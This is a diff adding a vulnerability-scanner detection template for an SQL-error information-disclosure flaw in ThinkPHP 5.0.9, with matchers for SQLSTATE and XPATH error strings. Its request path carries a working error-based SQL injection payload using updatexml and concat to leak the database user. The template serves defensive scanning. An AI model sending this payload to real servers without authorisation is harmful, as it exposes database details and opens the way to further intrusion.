@@ -1,0 +1,30 @@
+id: "thinkphp-509-information-disclosure"
+name: "ThinkPHP 5.0.9 - Information Disclosure"
+severity: "critical"
+description: "ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials."
+tech:
+  - "php"
+tags:
+  - "thinkphp"
+  - "vulhub"
+  - "sqli"
+  - "vuln"
+reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/in-sqlinjection"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "SQLSTATE"
+      - "XPATH syntax error"
+    condition: "and"
+  - type: "status"
+    status:
+      - 500
